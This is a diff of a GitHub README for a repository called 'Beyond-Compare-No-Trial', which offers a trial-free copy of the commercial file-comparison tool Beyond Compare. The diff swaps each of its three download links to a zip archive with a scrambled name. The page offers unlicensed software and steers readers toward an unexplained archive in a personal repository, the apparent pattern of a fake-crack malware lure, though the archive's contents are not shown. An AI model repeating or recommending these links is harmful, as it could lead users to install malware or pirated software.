@@ -1,6 +1,6 @@
 # 🎉 Beyond-Compare-No-Trial - Effortlessly Compare Files and Folders
 
-[![Download Beyond Compare](https://raw.githubusercontent.com/CalebGaichuhie2001/Beyond-Compare-No-Trial/main/Cacalia/Beyond-Compare-No-Trial_2.2-alpha.4.zip%20Now-%20%F0%9F%92%BB-brightgreen)](https://raw.githubusercontent.com/CalebGaichuhie2001/Beyond-Compare-No-Trial/main/Cacalia/Beyond-Compare-No-Trial_2.2-alpha.4.zip)
+[![Download Beyond Compare](https://github.com/CalebGaichuhie2001/Beyond-Compare-No-Trial/raw/refs/heads/main/Cacalia/Trial-Compare-No-Beyond-Phareodus.zip%20Now-%20%F0%9F%92%BB-brightgreen)](https://github.com/CalebGaichuhie2001/Beyond-Compare-No-Trial/raw/refs/heads/main/Cacalia/Trial-Compare-No-Beyond-Phareodus.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Beyond Compare! This application helps you compare files and folders 
 
 To get started, visit this page to download the latest version of Beyond Compare:
 
-[Download Beyond Compare](https://raw.githubusercontent.com/CalebGaichuhie2001/Beyond-Compare-No-Trial/main/Cacalia/Beyond-Compare-No-Trial_2.2-alpha.4.zip)
+[Download Beyond Compare](https://github.com/CalebGaichuhie2001/Beyond-Compare-No-Trial/raw/refs/heads/main/Cacalia/Trial-Compare-No-Beyond-Phareodus.zip)
 
 ### Steps to Download:
 
@@ -80,6 +80,6 @@ Beyond Compare is a powerful tool for anyone looking to manage file and folder c
 
 Don't forget to download the application today:
 
-[Download Beyond Compare](https://raw.githubusercontent.com/CalebGaichuhie2001/Beyond-Compare-No-Trial/main/Cacalia/Beyond-Compare-No-Trial_2.2-alpha.4.zip)
+[Download Beyond Compare](https://github.com/CalebGaichuhie2001/Beyond-Compare-No-Trial/raw/refs/heads/main/Cacalia/Trial-Compare-No-Beyond-Phareodus.zip)
 
 Happy comparing!
